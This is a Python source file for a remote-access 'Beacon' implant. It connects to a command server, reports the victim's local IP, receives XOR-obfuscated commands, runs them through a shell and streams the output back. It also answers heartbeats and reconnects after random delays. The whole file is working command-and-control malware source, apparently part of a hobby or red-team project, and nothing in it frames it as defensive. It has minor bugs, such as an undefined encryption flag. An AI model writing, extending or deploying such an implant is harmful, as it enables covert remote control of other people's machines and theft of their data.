#!/usr/bin/python3

import socket,subprocess,time,random,platform,signal

class Beacon:
   #Contains client side behavior and state

   __slots__ = ["sock","running","server_ip","server_port","debugging","key","local_ip"]

   def __init__(self,server_ip,server_port):
      self.running = False
      self.server_ip = server_ip
      self.server_port = server_port
      self.debugging = True
      self.key = "chandifortnite"
      self.local_ip = self.detect_local_ip()
      signal.signal(signal.SIGINT, self.terminate)
      signal.signal(signal.SIGTERM, self.terminate)

   def connect(self):
      try:
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.connect((self.server_ip,self.server_port))
         self.sock.send(self.encrypt(self.local_ip.encode()))
      except:
         self.sock.close()

   def run_command(self,command):
      ps = None
      try:
         cmd = command.split(" ")
         ps = subprocess.run(cmd, shell=True, capture_output=True,check=True)
         if self.debugging == True:
            print("Sending:" ,ps.stdout)
         if ps.stdout != None and ps.stdout != b'':
            if len(ps.stdout) > 50000:
               for i in range(0, len(ps.stdout), 50000):
                 chunk = ps.stdout[i:i+50000]
                 self.sock.send(self.encrypt(chunk))
               self.sock.send(self.encrypt("END".encode()))
            else:
               self.sock.send(self.encrypt(ps.stdout))
               self.sock.send(self.encrypt("END".encode()))
         else:
            self.sock.send(self.encrypt("SUCCESS".encode()))
            self.sock.send(self.encrypt("END".encode()))
      except Exception as e:
                     error_msg = f"ERROR: {str(e)}"
                     if self.debugging == True:
                        print(error_msg)
                     if self.encryption == True:
                        self.sock.send(self.encrypt(error_msg.encode()))
                     else:
                        self.sock.send(error_msg.encode())

   def start(self):
      self.running = True
      while self.running:
            self.connect()
            if self.sock:
                self.run()
            else:
                time.sleep(10)
   
   def run(self):
      try:
         while self.running:
               try:
                  data = self.decrypt(self.sock.recv(4096)).decode()
                  if not data:
                     # If no data is received, break the loop
                     break
                  if self.debugging == True:
                     print("Received:",data)
                  split = data.split("|")
                  if split[0] == "cmd":
                     self.run_command(split[1])
                  elif split[0] == "quit":
                     self.terminate()
                  elif split[0] == "heartbeat":
                     self.sock.send(self.encrypt("ACTIVE".encode()))
                  else:
                     self.sock.send(self.encrypt("Unknown Error".encode()))
               except Exception as e:
                  if self.debugging == True:
                     print(f"Error: {str(e)}")
                  self.sock.send(self.encrypt(f"Error: {str(e)}".encode()))
      except:
         try:
            time.sleep(random.randint(120,300))
            self.start()
         except RecursionError:
            quit()
            
   def terminate(self):
      self.running = False
      if self.sock:
         self.sock.shutdown(socket.SHUT_RDWR)
         self.sock.close()
   
   def xor(self, data, key):
      return bytes([a ^ b for a, b in zip(data, key)])

   def encrypt(self, data):
      key = self.key * (len(data) // len(self.key)) + self.key[:len(data) % len(self.key)]
      return self.xor(data, key.encode())

   def decrypt(self, data):
      key = self.key * (len(data) // len(self.key)) + self.key[:len(data) % len(self.key)]
      return self.xor(data, key.encode())
   
   def detect_local_ip(self):
      if platform.system() == "Windows":
         local_ip = socket.gethostbyname(socket.gethostname())
         return local_ip
      elif platform.system() == "Linux":
         local_ip = subprocess.run("hostname -I",shell=True,capture_output=True,text=True).stdout.strip().split()[0]
         return local_ip
      else:
         return "Unsupported OS"

def main():
   beacon = Beacon("127.0.0.1",10267)
   beacon.start()

if __name__ == "__main__":
   main()
